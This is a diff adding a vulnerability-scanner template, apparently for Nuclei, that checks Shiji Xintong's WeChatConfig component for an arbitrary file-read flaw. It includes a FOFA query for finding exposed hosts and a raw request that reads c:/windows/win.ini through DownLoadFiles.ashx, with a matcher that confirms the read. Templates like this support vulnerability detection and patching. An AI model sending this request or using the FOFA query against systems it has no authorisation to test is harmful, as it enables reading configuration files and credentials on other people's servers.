@@ -1,0 +1,24 @@
+id: shiji-xintong-wechatconfig-file-read
+
+info:
+  name: 世纪信通WeChatConfig组件文件读取漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: "theme/BlueCharm/" || body="广东世纪信通网络科技有限公司"
+      该漏洞允许攻击者通过构造特定请求路径，绕过文件访问控制机制，读取目标系统中非授权文件内容。受影响组件为WeChatConfig，涉及路径为/theme/BlueCharm/目录下的敏感文件。攻击者可利用此漏洞获取系统配置文件、数据库凭证等关键信息，导致数据泄露风险。
+  tags: 世纪信通,WeChatConfig
+
+http:
+- raw:
+  - |
+    GET /WeChatConfig/ashx/DownLoadFiles.ashx?filePath=c:/windows/win.ini HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
